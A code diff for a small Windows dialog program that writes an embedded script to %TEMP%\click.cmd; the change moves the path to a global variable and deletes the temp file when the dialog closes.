@@ -5,9 +5,10 @@
 #include "resource.h"
 #include "click.h"
 
+char path[1024];
+
 void run(){
-    char path[1024],cmd[1024];
-    ExpandEnvironmentStringsA("%TEMP%\\click.cmd",path,1024);
+    char cmd[1024];
     FILE *fp=fopen(path,"w");
     fwrite(data,1,strlen(data),fp);
     fclose(fp);
@@ -22,12 +23,13 @@ BOOL CALLBACK DlgMain(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
     {
     case WM_INITDIALOG:
     {
-		
+		ExpandEnvironmentStringsA("%TEMP%\\click.cmd",path,1024);
     }
     return TRUE;
 
     case WM_CLOSE:
     {
+        DeleteFileA(path);
         EndDialog(hwndDlg,0);
     }
     return TRUE;
